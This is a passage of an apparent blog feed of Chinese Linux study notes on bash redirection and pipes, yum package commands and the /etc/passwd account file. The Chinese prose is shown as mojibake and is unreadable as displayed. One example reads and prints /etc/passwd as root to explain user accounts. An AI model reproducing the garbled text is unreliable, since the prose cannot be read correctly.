<span class="token number">31</span> <span class="token number">20</span>:17 log.220210<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ—¥å¿—æ–‡ä»¶é‡‡ç”¨$todayå˜é‡çš„å€¼ä½œä¸ºæ–‡ä»¶åçš„ä¸€éƒ¨åˆ†ã€‚æ—¥å¿—æ–‡ä»¶çš„å†…å®¹æ˜¯<code>/usr/bin</code>ç›®å½•å†…å®¹çš„åˆ—è¡¨è¾“å‡ºã€‚å¦‚æœè„šæœ¬åœ¨æ˜å¤©è¿è¡Œï¼Œæ—¥å¿—æ–‡ä»¶åä¼šæ˜¯log.140201ï¼Œå°±è¿™æ ·ä¸ºæ–°çš„ä¸€å¤©åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶ã€‚ </p><h3 id="9-5-é‡å®šå‘è¾“å…¥å’Œè¾“å‡º"><a href="#9-5-é‡å®šå‘è¾“å…¥å’Œè¾“å‡º" class="headerlink" title="9.5 é‡å®šå‘è¾“å…¥å’Œè¾“å‡º"></a>9.5 é‡å®šå‘è¾“å…¥å’Œè¾“å‡º</h3><p>bash shellæä¾›äº†å‡ ä¸ªæ“ä½œç¬¦ï¼Œå¯ä»¥å°†å‘½ä»¤çš„è¾“å‡ºé‡å®šå‘åˆ°å¦ä¸€ä¸ªä½ç½®ï¼ˆæ¯”å¦‚æ–‡ä»¶ï¼‰ã€‚é‡å®šå‘å¯ä»¥ç”¨äºè¾“å…¥ï¼Œä¹Ÿå¯ä»¥ç”¨äºè¾“å‡ºï¼Œå¯ä»¥å°†æ–‡ä»¶é‡å®šå‘åˆ°å‘½ä»¤è¾“å…¥ã€‚  </p><h4 id="9-5-1-è¾“å‡ºé‡å®šå‘"><a href="#9-5-1-è¾“å‡ºé‡å®šå‘" class="headerlink" title="9.5.1 è¾“å‡ºé‡å®šå‘"></a>9.5.1 è¾“å‡ºé‡å®šå‘</h4><p>æœ€åŸºæœ¬çš„é‡å®šå‘å°†å‘½ä»¤çš„è¾“å‡ºå‘é€åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ã€‚ bash shellç”¨å¤§äºå·ï¼ˆ<code> &gt;</code>ï¼‰æ¥å®Œæˆè¿™é¡¹åŠŸèƒ½ï¼š </p><p> <code>command &gt; outputfile  </code></p><p>ä¹‹å‰æ˜¾ç¤ºå™¨ä¸Šå‡ºç°çš„å‘½ä»¤è¾“å‡ºä¼šè¢«ä¿å­˜åˆ°æŒ‡å®šçš„è¾“å‡ºæ–‡ä»¶ä¸­ã€‚  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># date &gt; test4</span>root@VM-16-11-debian:/tmp/test<span class="token comment"># ls -l test4</span>-rw-r--r-- <span class="token number">1</span> root root <span class="token number">32</span> Feb <span class="token number">10</span> <span class="token number">20</span>:23 test4root@VM-16-11-debian:/tmp/test<span class="token comment"># cat test4</span>Thu <span class="token number">10</span> Feb <span class="token number">2022</span> 08:23:20 PM HKT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¦‚æœè¾“å‡ºæ–‡ä»¶å·²ç»å­˜åœ¨äº†ï¼Œ<font color="#FF5E3A" size="3">é‡å®šå‘æ“ä½œç¬¦ä¼šç”¨æ–°çš„æ–‡ä»¶æ•°æ®è¦†ç›–å·²æœ‰æ–‡ä»¶</font>ã€‚  </p><p>è¦å°†å‘½ä»¤çš„è¾“å‡ºè¿½åŠ åˆ°å·²æœ‰æ–‡ä»¶ä¸­ ï¼Œç”¨åŒå¤§äºå·ï¼ˆ<code> &gt;&gt;</code>ï¼‰æ¥è¿½åŠ æ•°æ®ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># who &gt;&gt; test4</span>root@VM-16-11-debian:/tmp/test<span class="token comment"># ls -l test4</span>-rw-r--r-- <span class="token number">1</span> root root <span class="token number">88</span> Feb <span class="token number">10</span> <span class="token number">20</span>:25 test4root@VM-16-11-debian:/tmp/test<span class="token comment"># cat test4</span>Thu <span class="token number">10</span> Feb <span class="token number">2022</span> 08:23:20 PM HKTmyh      pts/0        <span class="token number">2022</span>-02-10 <span class="token number">19</span>:42 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="9-5-2-è¾“å…¥é‡å®šå‘"><a href="#9-5-2-è¾“å…¥é‡å®šå‘" class="headerlink" title="9.5.2 è¾“å…¥é‡å®šå‘"></a>9.5.2 è¾“å…¥é‡å®šå‘</h4><p>è¾“å…¥é‡å®šå‘å°†æ–‡ä»¶çš„å†…å®¹é‡å®šå‘åˆ°å‘½ä»¤ï¼Œè€Œéå°†å‘½ä»¤çš„è¾“å‡ºé‡å®šå‘åˆ°æ–‡ä»¶ã€‚  </p><p>è¾“å…¥é‡å®šå‘ç¬¦å·æ˜¯å°äºå·ï¼ˆ <code>&lt;</code>ï¼‰ï¼š <code>command &lt; inputfile </code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># wc &lt; test4</span> <span class="token number">2</span> <span class="token number">12</span> <span class="token number">88</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>wcå‘½ä»¤å¯ä»¥å¯¹å¯¹æ•°æ®ä¸­çš„æ–‡æœ¬è¿›è¡Œè®¡æ•°ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒä¼šè¾“å‡º3ä¸ªå€¼ ï¼š</p><ul><li> æ–‡æœ¬çš„è¡Œæ•°</li><li> æ–‡æœ¬çš„è¯æ•°</li><li> æ–‡æœ¬çš„å­—èŠ‚æ•°  </li></ul><h3 id="9-6-ç®¡é“"><a href="#9-6-ç®¡é“" class="headerlink" title="9.6 ç®¡é“"></a>9.6 ç®¡é“</h3><p><font color="#FF5E3A" size="3">å°†ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºä½œä¸ºå¦ä¸€ä¸ªå‘½ä»¤çš„è¾“å…¥</font>å¯ä»¥ç”¨é‡å®šå‘æ¥å®ç°ï¼Œä½†è¾ƒä¸ºç¹çï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># ls / &gt; test5.txt</span>root@VM-16-11-debian:/tmp/test<span class="token comment"># cat test5.txt </span>binbootâ€¦â€¦root@VM-16-11-debian:/tmp/test<span class="token comment"># sort &lt; test5.txt </span>binbootâ€¦â€¦<span class="token comment">#å¯èƒ½è¿™ä¸ªä¾‹å­ä¸å¤ªåˆç†ä¹‹æ—¶æ¼”ç¤ºå¤§è‡´æ„æ€</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥é€šè¿‡ç®¡é“è¿æ¥ï¼ˆ pipingï¼‰<code>| </code>ï¼š <code>command1 | command2  </code></p><p>Linuxç³»ç»Ÿä¼šåŒæ—¶è¿è¡Œè¿™ä¸¤ä¸ªå‘½ä»¤ï¼Œåœ¨ç³»ç»Ÿå†…éƒ¨å°†å®ƒä»¬è¿æ¥èµ·æ¥ã€‚<font color="#FF5E3A" size="3">åœ¨ç¬¬ä¸€ä¸ªå‘½ä»¤äº§ç”Ÿè¾“å‡ºçš„åŒæ—¶ï¼Œè¾“å‡ºä¼šè¢«ç«‹å³é€ç»™ç¬¬äºŒä¸ªå‘½ä»¤</font>ã€‚æ•°æ®ä¼ è¾“ä¸ä¼šç”¨åˆ°ä»»ä½•ä¸­é—´æ–‡ä»¶æˆ–ç¼“å†²åŒºã€‚  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># ls / | sort</span>binbootdataâ€¦â€¦<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥æ­é…ä½¿ç”¨é‡å®šå‘å’Œç®¡é“æ¥å°†è¾“å‡ºä¿å­˜åˆ°æ–‡ä»¶ä¸­ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">rpm</span> -qa <span class="token operator">|</span> <span class="token function">sort</span> <span class="token operator">&gt;</span> rpm.list$ <span class="token function">more</span> rpm.listabrt-1.1.14-1.fc14.i686abrt-addon-ccpp-1.1.14-1.fc14.i686abrt-addon-kerneloops-1.1.14-1.fc14.i686<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ°ç›®å‰ä¸ºæ­¢ï¼Œç®¡é“æœ€æµè¡Œçš„ç”¨æ³•ä¹‹ä¸€æ˜¯å°†å‘½ä»¤äº§ç”Ÿçš„å¤§é‡è¾“å‡ºé€šè¿‡ç®¡é“ä¼ é€ç»™<code>more</code>å‘½ä»¤ã€‚<br>è¿™å¯¹<code>ls</code>å‘½ä»¤æ¥è¯´å°¤ä¸ºå¸¸è§ ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux/202202102046394.png"></p><p><code>ls -l</code>å‘½ä»¤äº§ç”Ÿäº†ç›®å½•ä¸­æ‰€æœ‰æ–‡ä»¶çš„é•¿åˆ—è¡¨ã€‚å¯¹åŒ…å«å¤§é‡æ–‡ä»¶çš„ç›®å½•æ¥è¯´ï¼Œè¿™ä¸ªåˆ—è¡¨ä¼šç›¸å½“é•¿ã€‚é€šè¿‡å°†è¾“å‡ºç®¡é“è¿æ¥åˆ°<code>more</code>å‘½ä»¤ï¼Œå¯ä»¥å¼ºåˆ¶è¾“å‡ºåœ¨ä¸€å±æ•°æ®æ˜¾ç¤ºååœä¸‹æ¥ã€‚  </p><hr><p><font color="#FF9999" size="3">æ–‡ç« å‚è€ƒï¼šLinuxå‘½ä»¤è¡Œä¸shellè„šæœ¬ç¼–ç¨‹å¤§å…¨.ç¬¬3ç‰ˆ by å¸ƒé²å§†ï¼Œå¸ƒé›·æ–¯çº³æ±‰ (z-lib.org)</font></p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux/202202102046395.jpg" style="zoom:150%;">]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="å­¦ä¹ " scheme="https://huhu-myh.github.io/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="linux" scheme="https://huhu-myh.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>Linuxå­¦ä¹ -ç¬¬å…«ç« </title>
    <link href="https://huhu-myh.github.io/posts/myh10015.html"/>
    <id>https://huhu-myh.github.io/posts/myh10015.html</id>
    <published>2022-02-09T11:26:35.000Z</published>
    <updated>2022-02-09T12:13:09.066Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="ç¬¬å…«ç« ï¼šå®‰è£…è½¯ä»¶ç¨‹åº"><a href="#ç¬¬å…«ç« ï¼šå®‰è£…è½¯ä»¶ç¨‹åº" class="headerlink" title="ç¬¬å…«ç« ï¼šå®‰è£…è½¯ä»¶ç¨‹åº"></a>ç¬¬å…«ç« ï¼šå®‰è£…è½¯ä»¶ç¨‹åº</h2><h3 id="8-1-åŒ…ç®¡ç†åŸºç¡€"><a href="#8-1-åŒ…ç®¡ç†åŸºç¡€" class="headerlink" title="8.1 åŒ…ç®¡ç†åŸºç¡€"></a>8.1 åŒ…ç®¡ç†åŸºç¡€</h3><p>è½¯ä»¶åŒ…å­˜å‚¨åœ¨æœåŠ¡å™¨ä¸Šï¼Œå¯ä»¥åˆ©ç”¨æœ¬åœ°Linuxç³»ç»Ÿä¸Šçš„<strong>PMS</strong>å·¥å…·é€šè¿‡äº’è”ç½‘è®¿é—®ã€‚è¿™äº›æœåŠ¡å™¨ç§°ä¸ºä»“åº“ï¼ˆ repositoryï¼‰ã€‚å¯ä»¥ç”¨PMSå·¥å…·æ¥æœç´¢æ–°çš„è½¯ä»¶åŒ…ï¼Œæˆ–è€…æ˜¯æ›´æ–°ç³»ç»Ÿä¸Šå·²å®‰è£…è½¯ä»¶åŒ…ã€‚  </p><p>PMSåˆ©ç”¨ä¸€ä¸ªæ•°æ®åº“æ¥è®°å½•å„ç§ç›¸å…³å†…å®¹ï¼š  </p><ul><li> Linuxç³»ç»Ÿä¸Šå·²å®‰è£…äº†ä»€ä¹ˆè½¯ä»¶åŒ…ï¼›</li><li> æ¯ä¸ªåŒ…å®‰è£…äº†ä»€ä¹ˆæ–‡ä»¶ï¼›</li><li> æ¯ä¸ªå·²å®‰è£…è½¯ä»¶åŒ…çš„ç‰ˆæœ¬  </li></ul><p>è½¯ä»¶åŒ…é€šå¸¸ä¼šä¾èµ–å…¶ä»–çš„åŒ…ï¼Œä¸ºäº†å‰è€…èƒ½å¤Ÿæ­£å¸¸è¿è¡Œï¼Œè¢«ä¾èµ–çš„åŒ…å¿…é¡»æå‰å®‰è£…åœ¨ç³»ç»Ÿä¸­ã€‚PMSå·¥å…·å°†ä¼šæ£€æµ‹è¿™äº›ä¾èµ–å…³ç³»ï¼Œå¹¶åœ¨å®‰è£…éœ€è¦çš„åŒ…ä¹‹å‰<strong>å…ˆå®‰è£…å¥½æ‰€æœ‰é¢å¤–çš„è½¯ä»¶åŒ…</strong>ã€‚  </p><p>Linuxä¸­å¹¿æ³›ä½¿ç”¨çš„ä¸¤ç§ä¸»è¦çš„PMSåŸºç¡€å·¥å…·æ˜¯dpkgå’Œrpmã€‚  </p><h3 id="8-2-åŸºäº-Debian-çš„ç³»ç»Ÿ"><a href="#8-2-åŸºäº-Debian-çš„ç³»ç»Ÿ" class="headerlink" title="8.2 åŸºäº Debian çš„ç³»ç»Ÿ"></a>8.2 åŸºäº Debian çš„ç³»ç»Ÿ</h3><p>dpkgå‘½ä»¤æ˜¯åŸºäºDebianç³»PMSå·¥å…·çš„æ ¸å¿ƒã€‚åŒ…å«åœ¨è¿™ä¸ªPMSä¸­çš„å…¶ä»–å·¥å…·æœ‰ï¼š  </p><ul><li> apt-get</li><li> apt-cache</li><li> aptitude  </li></ul><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux/202202092003585.png"></p><h3 id="8-3-åŸºäº-Red-Hat-çš„ç³»ç»Ÿ"><a href="#8-3-åŸºäº-Red-Hat-çš„ç³»ç»Ÿ" class="headerlink" title="8.3 åŸºäº Red Hat çš„ç³»ç»Ÿ"></a>8.3 åŸºäº Red Hat çš„ç³»ç»Ÿ</h3><ul><li> yumï¼šåœ¨Red Hatå’ŒFedoraä¸­ä½¿ç”¨ã€‚</li><li> urpmï¼šåœ¨Mandrivaä¸­ä½¿ç”¨ã€‚</li><li> zypperï¼šåœ¨openSUSEä¸­ä½¿ç”¨ã€‚  </li></ul><h4 id="8-3-1-åˆ—å‡ºå·²å®‰è£…åŒ…"><a href="#8-3-1-åˆ—å‡ºå·²å®‰è£…åŒ…" class="headerlink" title="8.3.1 åˆ—å‡ºå·²å®‰è£…åŒ…"></a>8.3.1 åˆ—å‡ºå·²å®‰è£…åŒ…</h4><p>æ‰¾å‡ºç³»ç»Ÿä¸Šå·²å®‰è£…çš„åŒ…  ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum list installed<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¾“å‡ºçš„ä¿¡æ¯å¯èƒ½ä¼šåœ¨å±å¹•ä¸Šä¸€é—ªè€Œè¿‡ï¼Œæ‰€ä»¥æœ€å¥½æ˜¯å°†å·²å®‰è£…åŒ…çš„åˆ—è¡¨é‡å®šå‘åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ã€‚å¯ä»¥ç”¨moreæˆ–lesså‘½ä»¤ï¼ˆæˆ–ä¸€ä¸ªGUIç¼–è¾‘å™¨ï¼‰æŒ‰ç…§éœ€è¦æŸ¥çœ‹è¿™ä¸ªåˆ—è¡¨ã€‚  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum list installed <span class="token operator">&gt;</span> installed_software<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  yumæ“…é•¿æ‰¾å‡ºæŸä¸ªç‰¹å®šè½¯ä»¶åŒ…çš„è¯¦ç»†ä¿¡æ¯ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># yum list xterm</span>Loaded plugins: langpacks, presto, refresh-packagekitAdding en_US to language listAvailable Packagesxterm.i686 <span class="token number">253</span>-1.el6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥é€šè¿‡ä¸€æ¡ç®€å•çš„å‘½ä»¤æŸ¥çœ‹åŒ…æ˜¯å¦å·²å®‰è£…:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># yum list installed xterm</span>Loaded plugins: refresh-packagekitError: No matching Packages to list<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>  æœéœ€è¦æ‰¾å‡ºç³»ç»Ÿä¸Šçš„æŸä¸ªç‰¹å®šæ–‡ä»¶å±äºå“ªä¸ªè½¯ä»¶åŒ…ï¼Œä¸‡èƒ½çš„yumå¯ä»¥åšåˆ°ï¼</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#yum provides file_name</span><span class="token comment"># yum provides /etc/yum.conf</span>Loaded plugins: fastestmirror, refresh-packagekit, securityDetermining fastest mirrors* base: mirror.web-ster.com* extras: centos.chi.host-engine.com* updates: mirror.umd.eduyum-3.2.29-40.el6.centos.noarch <span class="token builtin class-name">:</span> RPM package installer/updater/managerRepo <span class="token builtin class-name">:</span> baseMatched from:Filename <span class="token builtin class-name">:</span> /etc/yum.confyum-3.2.29-43.el6.centos.noarch <span class="token builtin class-name">:</span> RPM package installer/updater/managerRepo <span class="token builtin class-name">:</span> updatesMatched from:Filename <span class="token builtin class-name">:</span> /etc/yum.confyum-3.2.29-40.el6.centos.noarch <span class="token builtin class-name">:</span> RPM package installer/updater/managerRepo <span class="token builtin class-name">:</span> installedMatched from:Other <span class="token builtin class-name">:</span> Provides-match: /etc/yum.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="8-3-2-ç”¨-yum-å®‰è£…è½¯ä»¶"><a href="#8-3-2-ç”¨-yum-å®‰è£…è½¯ä»¶" class="headerlink" title="8.3.2 ç”¨ yum å®‰è£…è½¯ä»¶"></a>8.3.2 ç”¨ yum å®‰è£…è½¯ä»¶</h4><p>åœ¨Linuxç³»ç»Ÿä¸Šï¼Œ #è¡¨æ˜ä½ æ˜¯ä»¥rootç”¨æˆ·èº«ä»½ç™»å½•çš„ã€‚åº”è¯¥åªæœ‰åœ¨è¿è¡Œç®¡ç†æ€§çš„ä»»åŠ¡æ—¶æ‰ä¸´æ—¶åˆ‡æ¢åˆ°rootç”¨æˆ·ï¼ˆæ¯”å¦‚å®‰è£…å’Œæ›´æ–°è½¯ä»¶ï¼‰ã€‚  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> package_name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="8-3-3-ç”¨-yum-æ›´æ–°è½¯ä»¶"><a href="#8-3-3-ç”¨-yum-æ›´æ–°è½¯ä»¶" class="headerlink" title="8.3.3 ç”¨ yum æ›´æ–°è½¯ä»¶"></a>8.3.3 ç”¨ yum æ›´æ–°è½¯ä»¶</h4><p>è¦åˆ—å‡ºæ‰€æœ‰å·²å®‰è£…åŒ…çš„å¯ç”¨æ›´æ–°ï¼Œè¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼š  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum list updates<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æœå‘ç°æŸä¸ªç‰¹å®šè½¯ä»¶åŒ…éœ€è¦æ›´æ–°ï¼Œè¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼š  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum update package_name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æœæƒ³å¯¹æ›´æ–°åˆ—è¡¨ä¸­çš„æ‰€æœ‰åŒ…è¿›è¡Œæ›´æ–°ï¼Œåªè¦è¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum update  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="8-3-4-ç”¨-yum-å¸è½½è½¯ä»¶"><a href="#8-3-4-ç”¨-yum-å¸è½½è½¯ä»¶" class="headerlink" title="8.3.4 ç”¨ yum å¸è½½è½¯ä»¶"></a>8.3.4 ç”¨ yum å¸è½½è½¯ä»¶</h4><p>åªåˆ é™¤è½¯ä»¶åŒ…è€Œä¿ç•™é…ç½®æ–‡ä»¶å’Œæ•°æ®æ–‡ä»¶ï¼Œå°±ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum remove package_name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¦åˆ é™¤è½¯ä»¶å’Œå®ƒæ‰€æœ‰çš„æ–‡ä»¶ï¼Œå°±ç”¨eraseé€‰é¡¹ï¼š  </p><pre class="line-numbers language-none"><code class="language-none">yum erase package_name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><p><font color="#FF9999" size="3">æ–‡ç« å‚è€ƒï¼šLinuxå‘½ä»¤è¡Œä¸shellè„šæœ¬ç¼–ç¨‹å¤§å…¨.ç¬¬3ç‰ˆ by å¸ƒé²å§†ï¼Œå¸ƒé›·æ–¯çº³æ±‰ (z-lib.org)</font></p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux/202202092003587.jpg" style="zoom:150%;">]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="å­¦ä¹ " scheme="https://huhu-myh.github.io/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="linux" scheme="https://huhu-myh.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>Linuxå­¦ä¹ -ç¬¬ä¸ƒç« </title>
    <link href="https://huhu-myh.github.io/posts/myh10014.html"/>
    <id>https://huhu-myh.github.io/posts/myh10014.html</id>
    <published>2022-02-06T11:55:19.000Z</published>
    <updated>2022-02-09T11:27:48.219Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="ç¬¬ä¸ƒç« ï¼šç†è§£Linuxæ–‡ä»¶æƒé™"><a href="#ç¬¬ä¸ƒç« ï¼šç†è§£Linuxæ–‡ä»¶æƒé™" class="headerlink" title="ç¬¬ä¸ƒç« ï¼šç†è§£Linuxæ–‡ä»¶æƒé™"></a>ç¬¬ä¸ƒç« ï¼šç†è§£Linuxæ–‡ä»¶æƒé™</h2><h3 id="7-1-Linux-çš„å®‰å…¨æ€§"><a href="#7-1-Linux-çš„å®‰å…¨æ€§" class="headerlink" title="7.1 Linux çš„å®‰å…¨æ€§"></a>7.1 Linux çš„å®‰å…¨æ€§</h3><p>Linuxå®‰å…¨ç³»ç»Ÿçš„æ ¸å¿ƒæ˜¯<font color="#FF5E3A" size="3">ç”¨æˆ·è´¦æˆ·</font>ã€‚æ¯ä¸ªèƒ½è¿›å…¥Linuxç³»ç»Ÿçš„ç”¨æˆ·éƒ½ä¼šè¢«åˆ†é…å”¯ä¸€çš„ç”¨æˆ·è´¦æˆ·ã€‚ç”¨æˆ·å¯¹ç³»ç»Ÿä¸­å„ç§å¯¹è±¡çš„è®¿é—®æƒé™å–å†³äºä»–ä»¬ç™»å½•ç³»ç»Ÿæ—¶ç”¨çš„è´¦æˆ·ã€‚  </p><p>ç”¨æˆ·æƒé™æ˜¯é€šè¿‡<font color="#FF5E3A" size="3">åˆ›å»ºç”¨æˆ·æ—¶åˆ†é…çš„ç”¨æˆ·IDï¼ˆ User IDï¼Œé€šå¸¸ç¼©å†™ä¸ºUIDï¼‰æ¥è·Ÿè¸ªçš„</font>ã€‚ UIDæ˜¯æ•°å€¼ï¼Œæ¯ä¸ªç”¨æˆ·éƒ½æœ‰å”¯ä¸€çš„UIDï¼Œä½†åœ¨ç™»å½•ç³»ç»Ÿæ—¶ç”¨çš„ä¸æ˜¯UIDï¼Œè€Œæ˜¯ç™»å½•åã€‚ Linuxç³»ç»Ÿä½¿ç”¨ç‰¹å®šçš„æ–‡ä»¶å’Œå·¥å…·æ¥è·Ÿè¸ªå’Œç®¡ç†ç³»ç»Ÿä¸Šçš„ç”¨æˆ·è´¦æˆ·ã€‚  </p><h4 id="7-1-1-etc-passwd-æ–‡ä»¶"><a href="#7-1-1-etc-passwd-æ–‡ä»¶" class="headerlink" title="7.1.1 /etc/passwd æ–‡ä»¶"></a>7.1.1<code> /etc/passwd</code> æ–‡ä»¶</h4><p>Linuxç³»ç»Ÿä½¿ç”¨ä¸€ä¸ªä¸“é—¨çš„æ–‡ä»¶æ¥å°†ç”¨æˆ·çš„ç™»å½•ååŒ¹é…åˆ°å¯¹åº”çš„UIDå€¼ã€‚è¿™ä¸ªæ–‡ä»¶å°±æ˜¯<code>/etc/passwd</code>æ–‡ä»¶ï¼Œå®ƒåŒ…å«äº†ä¸€äº›ä¸ç”¨æˆ·æœ‰å…³çš„ä¿¡æ¯ã€‚  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># cat /etc/passwd</span>root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinâ€¦â€¦<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><font color="#FF5E3A" size="3">rootç”¨æˆ·è´¦æˆ·æ˜¯Linuxç³»ç»Ÿçš„ç®¡ç†å‘˜ï¼Œå›ºå®šåˆ†é…ç»™å®ƒçš„UIDæ˜¯0</font>ã€‚å°±åƒä¸Šä¾‹ä¸­æ˜¾ç¤ºçš„ï¼Œ Linuxç³»ç»Ÿä¼šä¸ºå„ç§å„æ ·çš„åŠŸèƒ½åˆ›å»ºä¸åŒçš„ç”¨æˆ·è´¦æˆ·ï¼Œè€Œè¿™äº›è´¦æˆ·å¹¶ä¸æ˜¯çœŸçš„ç”¨æˆ·ï¼Œè¿™äº›è´¦æˆ·å«ä½œ<font color="#FF5E3A" size="3">ç³»ç»Ÿè´¦æˆ·</font>ï¼Œæ˜¯ç³»ç»Ÿä¸Šè¿è¡Œçš„å„ç§æœåŠ¡è¿›ç¨‹è®¿é—®èµ„æºç”¨çš„ç‰¹æ®Šè´¦æˆ·ã€‚æ‰€æœ‰è¿è¡Œåœ¨åå°çš„æœåŠ¡éƒ½éœ€è¦ç”¨ä¸€ä¸ªç³»ç»Ÿç”¨æˆ·è´¦æˆ·ç™»å½•åˆ°Linuxç³»ç»Ÿä¸Š ã€‚</p><p>Linuxä¸ºç³»ç»Ÿè´¦æˆ·é¢„ç•™äº†500ä»¥ä¸‹çš„UIDå€¼ã€‚æœ‰äº›æœåŠ¡ç”šè‡³è¦ç”¨ç‰¹å®šçš„UIDæ‰èƒ½æ­£å¸¸å·¥ä½œã€‚ä¸ºæ™®é€šç”¨æˆ·åˆ›å»ºè´¦æˆ·æ—¶ï¼Œå¤§å¤šæ•°Linuxç³»ç»Ÿä¼šä»500å¼€å§‹ï¼Œå°†ç¬¬ä¸€ä¸ªå¯ç”¨UIDåˆ†é…ç»™è¿™ä¸ªè´¦æˆ·ï¼ˆå¹¶éæ‰€æœ‰çš„Linuxå‘è¡Œç‰ˆéƒ½æ˜¯è¿™æ ·ï¼‰ã€‚  </p><p><code>etc/passwd</code>æ–‡ä»¶çš„å­—æ®µåŒ…å«äº†å¦‚ä¸‹ä¿¡æ¯ï¼š</p><ul><li> ç™»å½•ç”¨æˆ·å</li><li> ç”¨æˆ·å¯†ç </li><li> 